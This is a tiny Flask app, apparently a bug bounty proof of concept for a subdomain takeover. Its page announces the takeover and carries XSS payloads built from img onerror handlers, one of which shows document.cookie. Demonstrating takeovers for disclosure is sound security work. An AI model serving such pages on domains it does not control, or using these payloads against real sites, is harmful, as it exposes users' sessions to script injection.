from flask import Flask
app = Flask(__name__)

@app.route("/")
def hello():
    return "<h1>Bozkurt97/Bozx - @Intigriti/Hackerone/YesWehack/Bugbounty.ch, subdomain takeover!<img src=x onerror=confirm(9)><img src=x onerror=confirm(document.cookie)>..."
